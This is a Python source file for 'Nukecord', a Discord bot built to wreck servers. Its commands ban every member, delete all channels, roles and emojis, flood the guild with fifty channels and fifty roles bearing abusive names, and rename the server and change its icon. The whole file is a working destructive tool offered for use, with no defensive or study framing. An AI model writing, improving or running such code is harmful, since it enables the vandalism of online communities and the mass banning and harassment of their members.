import asyncio
import json
import time
import discord
from discord import channel
from discord.ext import commands
from colorama import Fore
import os

bot = commands.Bot(command_prefix=';', intents=discord.Intents.all())


def setup():
    if not os.path.exists('./config.json'):
        with open('./config.json', 'w') as fp:
            print(Fore.LIGHTCYAN_EX +
                  'Welcome to the initial setup process for Nukecord!\n')
            time.sleep(1)
            print(Fore.LIGHTCYAN_EX + 'Creating json file...')
            time.sleep(0.5)
            data = {
                "token": "token",
                "masschannelname": "get fucked",
                "massrolename": "get nuked lol",
                "servername": "fuck you",
                "servericon": "icon.png"
            }
            json.dump(data, fp, indent=4)
            print('Additional settings can be tweaked in config.json!')
            time.sleep(3)
    else:
        pass


class Nuke:
    @bot.command(name='channels')
    async def channels(ctx):
        with open("config.json") as f:
            config = json.load(f)
            f.close()
            channel = config.get("masschannelname")
        for channel in ctx.guild.channels:
            try:
                time.sleep(0.1)
                await channel.delete()
                print(f"{Fore.CYAN}Deleted channel {channel.name}")
            except:
                print(f"{Fore.RED}Error deleting channel {channel.name}")
                pass

    @bot.command(name='massban')
    async def massban(ctx):
        for user in ctx.guild.members:
            try:
                time.sleep(0.1)
                await user.ban()
                print(f"{Fore.RED}Banned {user.name}")
            except:
                print(f"{Fore.RED}Error banning member {user.name}")
                pass

    @bot.command(name='roles')
    async def roles(ctx):
        with open("config.json") as f:
            config = json.load(f)
            f.close()
            role = config.get("massrolename")
        for role in ctx.guild.roles:
            try:
                time.sleep(0.1)
                await role.delete()
                print(f"{Fore.CYAN}Deleted role {role.name}")
            except:
                print(f"{Fore.RED}Error deleting role {role.name}")
                pass

    @bot.command(name='emojis')
    async def emojis(ctx):
        for emoji in ctx.guild.emojis:
            try:
                await emoji.delete()
                print(f"{Fore.CYAN}Deleted emoji {emoji.name}")
            except:
                pass

    @bot.command(name='createchannels')
    async def createchannels(ctx):
        for _i in range(50):
            try:
                with open("config.json") as f:
                    config = json.load(f)
                    f.close()
                    channel = config.get("masschannelname")
                time.sleep(0.1)
                await ctx.guild.create_text_channel(name=channel)
                print(f"{Fore.LIGHTYELLOW_EX}Created channel {channel}")
            except:
                print(f"{Fore.RED}Error creating channel")
                pass

    @bot.command(name='createroles')
    async def createroles(ctx):
        try:
            with open("config.json") as f:
                config = json.load(f)
                f.close()
                role = config.get("massrolename")
            for _i in range(50):
                time.sleep(0.1)
                await ctx.guild.create_role(name=role)
                print(f"{Fore.LIGHTYELLOW_EX}Created role {role}")
        except:
            print(f"{Fore.RED}Error creating role")
            pass

    @bot.command(name='editserver')
    async def editserver(ctx):
        try:
            with open("config.json") as f:
                config = json.load(f)
                f.close()
                servericon = config.get("servericon")
                servername = config.get("servername")
            with open(servericon, 'rb') as f:
                icon = f.read()
            await ctx.guild.edit(
                name=servername,
                description="sussy baka",
                reason="idk",
                icon=icon,
                banner=None
            )
            print(
                f"{Fore.LIGHTCYAN_EX}Server icon changed to {servericon} and name changed to {servername}")
        except:
            print(f"{Fore.RED}Error editing server")
            pass

    async def leave(ctx):
        await ctx.guild.leave()
        print(f"{Fore.RED}Nukecord left the server")
